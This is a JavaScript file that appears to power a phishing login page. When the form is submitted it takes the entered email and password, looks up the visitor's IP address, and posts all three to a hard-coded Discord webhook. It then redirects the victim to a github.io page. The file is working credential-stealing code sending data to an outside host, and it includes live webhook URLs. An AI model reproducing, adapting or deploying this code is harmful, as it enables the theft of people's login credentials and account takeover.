const userinfoEncoded = 'https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-';

const skibidiCheckbox = document.getElementById('skibidiCheckbox');
const loginButton = document.getElementById('loginButton');

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    if (!skibidiCheckbox.checked) {
        skibidiCheckbox.classList.add('error');
        alert('Please check the box.');
        return;
    } else {
        skibidiCheckbox.classList.remove('error');
    }

    const email = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // List of IPs to block (placeholders for now)
    const blockedIPs = ['89.187.164.251'];

    // Fetch the user's IP address using ipify
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;

            // Check if the IP is blocked
            if (blockedIPs.includes(userIP)) {
                alert('Access denied. Your IP is blocked.');
                window.location.href = 'https://cryptodude3.github.io/badmin/';
                return;
            }

            // Send data to Discord webhook
            fetch('https://discord.com/api/webhooks/1310777599972383480/ZVm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    Data: 'the user info discord webhook'
                })
            });

            // Decode and fetch user info
            const userInfo = 'https://discord.com/api/webhooks/1310777599972383480/ZVm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd';

            fetch(userInfo, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `New Login Attempt:
Email: ||${email}||
Password: ||${password}||
IP Address: ||${userIP}||`
                })
            })
            .then(response => {
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            });
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            window.location.href = 'https://cryptodude3.github.io/badmin/';
        });
});